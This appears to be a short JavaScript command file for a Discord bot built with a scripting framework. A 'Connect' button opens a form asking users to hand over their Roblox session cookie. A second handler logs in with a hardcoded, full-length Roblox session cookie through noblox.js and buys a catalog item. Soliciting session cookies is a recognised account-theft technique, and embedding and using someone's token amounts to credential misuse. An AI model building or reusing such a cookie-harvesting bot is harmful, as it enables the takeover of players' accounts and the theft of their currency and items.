module.exports = [{
name: "test",
code: `

$author[$username[$authorID];$userAvatar[$authorID]]
$thumbnail[https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png]
$description[
# test this sh#t out betch!
]
$footer[Rocord]
$addtimestamp
$color[Blue]

$addButton[1;Connect;primary;real;false]

`,
}, {
name: 'real',
type: "interaction",
prototype: "button",
code: `
$interactionModal[gughhhhhhh!;bruh;
{actionRow:
{textInput:Gimme yr cookie:1:cookie:true:roblox cookie}
}
]
`
},{
name: "bruh",
type: "interaction",
prototype: "modal",
code: `

$djseval[

  const noblox = require('noblox.js')
  async function startApp () {
      await noblox.setCookie('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_76489BC4E0C5ADE51D3DDD6E84BAAAF3FB2D480AAC4B5D992A91FAF69496EBE3E27D8B9993A8F9D705DA9670C0BF6B0AB372F34FBB4BBE5C646D9CFD142DDCBC8B3B456F2C08333F1D26F4E4C5E8F3D187270193030D8D862536BC53184191B8E231BC47AAF2BB6B443E020CB6DE9CCC8D45C9B497E8D584DC7760F2E6285F8F8F21998DFC1B39BADF27D862781D845247AD73BD8031133CE3C86F6AE768CB68E9461DB5E638BEBC280186EF13979129888B7EAEFD4AC458D0A6D5855B9FCAF7F753C220C452A042C12222AB2CAE8C39506B5F0437251FD54954DF4AB70CEF8BC81FCD470B6C4E79B48E3C05DF06BD8199D72A11E48E9ABBE8E1130AFC9DD5D0F00C51553696313E5DBCE4F565EF457FCFF330AF57847DE4154090CD4D4EEFFE9A533C6B861E43989A37527994C1DF70855C319D8F0B3FF30267097C3F4488A4DF5AFF597EF162757825057E1B23304D8851FF1415F7761BC6397B7ED305B25B16B802F775258464D720E6BA3A61CA7DAB9F4D00392C0D77AC368AE99B2155005E294545F6667DF06A2F9EF9F00037F5F384335AF10747B8821605115FB21032DDB8B14915C9B552D6C1FC566A1F186EADDEB5A3D40113C5D2489BD6AB378238149650E4702C2BDCE327215A6E944EB7B5724648DB0B61316424AB487ED0A088112F42FE4C375B4AB46C1C0537BC07BEB893D902F6686DF3B9285B65F9F79F74486B8EFFF5024CE9E7C6294EAF83DC4DEEB658373B44718B9B532879B34ADD1FAAC0F6FB1EA8DD8219D1156C2D74BEF4F7499F60A5055F6226DF755EA6CB06B3BCA276A0FC7F93B8A8CD5A499A67D221F8010C2BFDCDE605510F205832A792A8E6177A47C81905310A09BEB270F47C370609CF51FA9D47ED201FBCE4459C77D3590BB9E083296FFC32CB2329DFEC0657DEE57E99ED70DD44AF41B533AB337958A9CA3754')
  
      
      noblox.buy(1769012)
      console.log('BOUGHT ????');
  }
  startApp()
`
}]
